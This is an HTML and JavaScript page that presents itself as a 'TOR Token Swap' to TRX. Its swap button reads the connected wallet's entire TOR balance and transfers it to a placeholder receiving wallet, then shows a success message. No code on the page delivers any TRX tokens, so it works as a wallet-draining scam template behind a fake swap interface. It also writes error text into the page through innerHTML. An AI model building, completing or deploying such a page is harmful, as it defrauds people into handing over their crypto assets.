<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TOR Token Swap to TRX</title>
  <style>
    /* Your existing CSS styles */
  </style>
</head>
<body>
  <div class="container">
    <h1>TOR Token Swap</h1>
    <p>Swap your TOR (BSC/Fantom) to TRX-based TOR</p>
    
    <button id="connectWallet">Connect Wallet</button>
    <button id="swapButton" disabled>Swap to TRX TOR</button>
    
    <div id="status" class="status" style="display: none;"></div>
  </div>

  <!-- Load Ethers.js from CDN (corrected) -->
  <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
  <script>
    // Wrap code in an async function to ensure ethers is loaded
    async function init() {
      let provider;
      let signer;
      let userAddress;

      // TOR Token Contract (BSC)
      const TOR_BSC_CONTRACT = "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83";
      const TOR_ABI = [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ];

      // Connect Wallet (MetaMask/Trust Wallet)
      document.getElementById("connectWallet").addEventListener("click", async () => {
        if (window.ethereum) {
          try {
            provider = new ethers.providers.Web3Provider(window.ethereum);
            await window.ethereum.request({ method: "eth_requestAccounts" });
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            
            document.getElementById("connectWallet").textContent = `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
            document.getElementById("swapButton").disabled = false;
            
            updateStatus("Wallet connected!", "success");
          } catch (err) {
            updateStatus("Error connecting wallet: " + err.message, "error");
          }
        } else {
          updateStatus("Please install MetaMask or Trust Wallet!", "error");
        }
      });

      // Swap Function
      document.getElementById("swapButton").addEventListener("click", async () => {
        if (!signer) {
          updateStatus("Please connect your wallet first.", "error");
          return;
        }

        try {
          updateStatus("Processing swap...", "success");
          
          const torContract = new ethers.Contract(TOR_BSC_CONTRACT, TOR_ABI, signer);
          const balance = await torContract.balanceOf(userAddress);
          
          if (balance.eq(0)) {
            updateStatus("You have 0 TOR tokens to swap.", "error");
            return;
          }

          // Send TOR to your swap wallet (replace with your BSC address)
          const tx = await torContract.transfer("YOUR_BSC_RECEIVING_WALLET", balance);
          await tx.wait();
          
          updateStatus(`Swap successful! TX: <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">View on BscScan</a>`, "success");
        } catch (err) {
          updateStatus("Swap failed: " + err.message, "error");
        }
      });

      // Update status message
      function updateStatus(message, type) {
        const statusDiv = document.getElementById("status");
        statusDiv.style.display = "block";
        statusDiv.innerHTML = message; // Use innerHTML for links
        statusDiv.className = `status ${type}`;
      }
    }

    // Initialize after Ethers.js is loaded
    window.addEventListener('load', init);
  </script>
</body>
</html>
